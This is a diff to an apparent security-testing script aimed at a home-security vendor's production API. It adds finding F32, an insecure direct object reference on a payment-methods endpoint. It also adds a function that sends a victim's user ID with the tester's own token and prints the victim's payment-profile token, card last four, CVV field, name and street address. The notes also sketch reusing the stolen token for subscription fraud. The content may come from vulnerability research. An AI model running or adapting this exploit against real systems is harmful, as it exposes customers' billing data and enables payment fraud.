@@ -255,6 +255,24 @@ FINDINGS = [
                   'F31 is distinct from F30 (admin.monitoring=false via SID): different identifier (locationId), different service layer, controls premium features not monitoring toggle. '
                   'Test: GET monitoring/v2/locations/{victim_locationId}/features with own token; 200 = CRITICAL. '
                   'Then PUT monitoring/v1/locations/{victim_locationId}/features/LiveGuardProtection body {"enabled":false}; 200/204 = CRITICAL write.'),
+    Finding("F32", "CRITICAL", "Payment Profile IDOR — Stored Card Tokens + Full Billing Address",
+            "yoda", "/v1/users/{userId}/paymentMethods", "GET", None,
+            verified=False,
+            notes='APK: SimpliSafeRestService.java (classes14.dex). '
+                  'GET /v1/users/{userId}/paymentMethods -> List<PaymentProfile>. '
+                  'PaymentProfile fields: paymentProfileId, ccNumber (@SerialName alternate: lastFour), '
+                  'ccCvv (present in model — server may return null; PCI violation if non-null), '
+                  'ccType (CreditCardIssuer enum), expMonth, expYear, paymentType, '
+                  'address{firstName, lastName, street1, street2, city, state, zip, phone}. '
+                  'If userId not validated against JWT: '
+                  '(1) Read victim paymentProfileId (stored payment processor token — Stripe/Braintree vault). '
+                  '(2) Read victim full billing address: firstName+lastName+street+city+state+zip+phone. '
+                  '(3) Read last-4, expiry, card type for victim. '
+                  '(4) paymentProfileId may be reusable with POST accounts/{accountId}/locations/bulkPaymentUpdate '
+                  '    to assign victim\'s stored card to attacker\'s locations (subscription fraud). '
+                  'Note: ccCvv field exists in model; if API returns non-null CVV this is a PCI DSS prohibited storage violation. '
+                  'Test: GET /v1/users/{victim_userId}/paymentMethods with own token; '
+                  '200+paymentProfileId = CRITICAL. Check ccCvv field value.'),
 ]
 
 
@@ -835,6 +853,34 @@ def test_face_idor(token, victim_sid, limit=5):
     if r:
         _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
                f"face/rated  {r.text[:150]}")
+
+
+def test_payment_profile_idor(token, victim_uid):
+    """F32: Read victim's stored payment profile tokens + full billing address."""
+    print(f"\n=== F32 — Payment Profile IDOR (victim_uid={victim_uid}) ===")
+    r = get(f"{SERVICES['yoda']}/v1/users/{victim_uid}/paymentMethods", token=token)
+    if not r:
+        print("  Request failed"); return
+    if r.status_code == 200:
+        try:
+            profiles = r.json()
+            if not isinstance(profiles, list):
+                profiles = [profiles]
+            for p in profiles[:2]:
+                pid = p.get("paymentProfileId")
+                cc = p.get("ccNumber") or p.get("lastFour")
+                cvv = p.get("ccCvv")
+                addr = p.get("address", {})
+                name = f"{addr.get('firstName','')} {addr.get('lastName','')}".strip()
+                street = addr.get("street1")
+                _print("CRIT", 200,
+                       f"PAYMENT PROFILE uid={victim_uid} id={pid} last4={cc} "
+                       f"cvv={'PRESENT:'+str(cvv) if cvv else 'null'} "
+                       f"name={name} street={street}")
+        except Exception as e:
+            _print("CRIT", 200, f"200 OK (parse err: {e}) raw={r.text[:200]}")
+    else:
+        _print("INFO", r.status_code, f"paymentMethods/{victim_uid}: {r.text[:100]}")
 
 
 def test_monitoring_feature_idor(token, victim_location_id):
